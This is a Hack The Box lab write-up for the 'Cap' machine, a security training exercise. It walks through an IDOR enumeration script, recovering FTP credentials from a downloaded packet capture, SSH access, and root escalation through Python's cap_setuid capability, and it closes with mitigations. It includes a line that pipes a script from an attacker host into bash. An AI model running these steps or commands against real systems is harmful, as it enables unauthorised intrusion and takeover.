# Cap

![HTB](https://img.shields.io/badge/Hack%20The%20Box-Machine-9FEF00?style=flat&logo=hackthebox&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat)
![OS](https://img.shields.io/badge/OS-Linux-informational?style=flat&logo=linux&logoColor=white)
![Status](https://img.shields.io/badge/Status-Pwned-9FEF00?style=flat)

---

## Overview

| Field | Details |
|---|---|
| Machine Name | Cap |
| Difficulty | Easy |
| Operating System | Linux |
| IP Address | 10.10.10.245 |

---

## Summary

> Cap is an easy Linux machine running a Gunicorn-powered Security Dashboard web app. An IDOR vulnerability on the `/data/[id]` endpoint exposes other users' packet capture files, one of which contains plaintext FTP credentials for the user `nathan`. Password reuse grants SSH access, and local enumeration reveals that `/usr/bin/python3.8` has the `cap_setuid` Linux capability set — allowing trivial privilege escalation to root.

---

## 1. Reconnaissance

### Nmap Scan

```bash
# Initial quick scan
nmap -T2 10.10.10.245

# Detailed service/script scan
nmap -p21,22,80 -sC -sV -oN nmap/initial.txt 10.10.10.245
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
```

### Open Ports

| Port | Protocol | Service | Version |
|---|---|---|---|
| 21 | TCP | FTP | vsftpd 3.0.3 |
| 22 | TCP | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 |
| 80 | TCP | HTTP | Gunicorn (Python web server) |

### Notes

> Three services: FTP, SSH, and a Python Gunicorn web app. The web app is the most interesting entry point. FTP and SSH will likely require credentials found elsewhere. No anonymous FTP login observed.

---

## 2. Enumeration

### Web Enumeration

> HTTP service on port 80 serves a **Security Dashboard** interface. Navigating the app reveals a "Security Snapshot" feature accessible at `/data/[id]`, which returns downloadable `.pcap` files tied to network captures.

```bash
# Browse to the app
http://10.10.10.245/

# Discover the IDOR-vulnerable endpoint
http://10.10.10.245/data/[id]

# Automated enumeration of valid IDs
python3 idor_enum.py
```

```python
import requests

def get_data(ip_address, id_param):
    url = f"http://{ip_address}/data/{id_param}"
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException:
        return None

if __name__ == "__main__":
    ip = "10.10.10.245"
    for id in range(0, 1000):
        res = get_data(ip, id)
        if res:
            with open(f"{id}.txt", 'w') as f:
                f.write(res)
```

```bash
# Filter responses for valid scan entries
grep -Hr "Data Type"
```

> Valid scan IDs found: 0, 1, 2. ID 0 is the most interesting — it corresponds to a capture of traffic from the machine itself, including plaintext FTP authentication.

---

### Other Services

> FTP (port 21) — tested for anonymous login, not permitted. Revisited after credential discovery.

```bash
ftp 10.10.10.245
# anonymous login: denied
```

---

## 3. Foothold

### Vulnerability Identified

> **Insecure Direct Object Reference (IDOR)** on `/data/[id]`. The application does not enforce authorization checks on PCAP file access. Any user can enumerate and download captures belonging to other sessions by simply changing the numeric ID in the URL. No CVE — this is a logic/design flaw.

### Exploitation

```bash
# Download PCAP from ID 0
http://10.10.10.245/data/0
# Click "Download" to get the .pcap file

# Open in Wireshark and filter for FTP traffic
# Follow TCP stream on FTP session to reveal cleartext credentials
```

> Downloading the `.pcap` from ID 0 and analyzing it in Wireshark (filtering for FTP traffic) reveals a full FTP authentication exchange in plaintext:

```
Username: nathan
Password: Buck3tH4TF0RM3!
```

### Shell Obtained

> Initial access via SSH using the credentials extracted from the PCAP file. Logged in as user `nathan`.

```bash
ssh nathan@10.10.10.245
# Password: Buck3tH4TF0RM3!
```

> Alternatively, FTP access also works and allows retrieval of the user flag directly:

```bash
ftp 10.10.10.245
get user.txt
```

---

## 4. Lateral Movement

> Not applicable. Credentials obtained from the PCAP directly grant access as `nathan` via SSH. No intermediate pivoting required.

---

## 5. Privilege Escalation

### Enumeration

```bash
# Upload and run LinPEAS
curl http://<attacker-ip>/linpeas.sh | bash

# Or manually check capabilities
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

> LinPEAS (and manual `getcap`) reveals that `/usr/bin/python3.8` has the `cap_setuid` Linux capability. This allows the binary to arbitrarily change the UID of its running process — equivalent to `setuid(0)` → root — without requiring a SUID bit or sudo. See: [GTFOBins – Python Capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities).

### Exploitation

```bash
# One-liner escalation
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Or interactively
/usr/bin/python3.8
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
```

> Calling `os.setuid(0)` sets the process UID to 0 (root). Spawning `/bin/bash` from that process yields a root shell. Verified with `whoami && id`.

### Root / Administrator Access

> Root shell confirmed:

```bash
root@cap:~# whoami && id
root
uid=0(root) gid=1001(nathan) groups=1001(nathan)

root@cap:~# cat /root/root.txt
<root flag here>
```

---

## 6. Flags

| Flag | Value |
|---|---|
| User | (retrieve via `cat /nathan/user.txt`) |
| Root | (retrieve via `cat /root/root.txt`) |

---

## 7. Lessons Learned

> - IDOR vulnerabilities can have a massive impact when combined with sensitive data — always test numeric/sequential object references in web apps.
> - Packet captures stored server-side and accessible without proper authorization are a significant information disclosure risk.
> - Plaintext protocols like FTP should never be used for authenticated sessions — credentials are trivially recoverable.
> - Linux capabilities (`cap_setuid`) on interpreter binaries like Python are extremely dangerous and essentially equivalent to SUID root. Always audit capabilities with `getcap -r / 2>/dev/null` during local enumeration.
> - Password reuse across services (FTP → SSH) extended the impact of a single credential leak.

---

## 8. Mitigation & Hardening

> - **IDOR**: Enforce server-side authorization checks on all object references. Associate PCAP files with authenticated user sessions and deny cross-user access.
> - **Plaintext protocols**: Disable FTP entirely; use SFTP or SCP over SSH instead.
> - **PCAP exposure**: Never store raw packet capture files in web-accessible directories without strict access control.
> - **Linux capabilities**: Audit and remove unnecessary capabilities from binaries. `cap_setuid` on a general-purpose interpreter like Python should never be set in production. Use `setcap -r /usr/bin/python3.8` to strip it.
> - **Password reuse**: Enforce distinct credentials per service and consider key-based SSH authentication only.

---

## References

- [GTFOBins – Python Capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)
- [OWASP – Insecure Direct Object Reference](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [Linux Capabilities man page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [LinPEAS – Privilege Escalation Awesome Script](https://github.com/carlospolop/PEASS-ng)
- [IppSec – Cap Walkthrough (YouTube)](https://www.youtube.com/watch?v=Fmm4xyoSVa8)
